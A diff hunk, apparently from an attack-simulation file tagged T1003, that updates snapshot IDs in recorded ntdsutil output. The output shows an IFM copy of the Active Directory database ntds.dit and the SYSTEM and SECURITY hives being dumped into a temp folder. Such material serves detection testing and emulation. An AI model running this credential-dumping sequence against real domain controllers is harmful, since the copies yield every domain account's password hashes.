@@ -41,11 +41,11 @@ simulation:
     ntdsutil: ifm
     ifm: create full C:\Windows\Temp\ntds_T1003
     Creating snapshot...
-    Snapshot set {2a1b40cb-b55e-47ac-9cf8-af526254d2f1} generated successfully.
-    Snapshot {445182e6-9f24-4dc8-8dff-d3ee6e6da34a} mounted as C:\$SNAP_202307181047_VOLUMEC$\
-    Snapshot {445182e6-9f24-4dc8-8dff-d3ee6e6da34a} is already mounted.
+    Snapshot set {c0d4d436-df51-4a77-a233-af9dba4b9562} generated successfully.
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} mounted as C:\$SNAP_202307190903_VOLUMEC$\
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} is already mounted.
     Initiating DEFRAGMENTATION mode...
-        Source Database: C:\$SNAP_202307181047_VOLUMEC$\Windows\NTDS\ntds.dit
+        Source Database: C:\$SNAP_202307190903_VOLUMEC$\Windows\NTDS\ntds.dit
         Target Database: C:\Windows\Temp\ntds_T1003\Active Directory\ntds.dit
 
                       Defragmentation  Status ( omplete)
@@ -57,7 +57,7 @@ simulation:
     Copying registry files...
     Copying C:\Windows\Temp\ntds_T1003\registry\SYSTEM
     Copying C:\Windows\Temp\ntds_T1003\registry\SECURITY
-    Snapshot {445182e6-9f24-4dc8-8dff-d3ee6e6da34a} unmounted.
+    Snapshot {c2a8e337-08bf-49c7-9936-0f4ebe3fed82} unmounted.
     IFM media created successfully in C:\Windows\Temp\ntds_T1003
     ifm: q
     ntdsutil: q
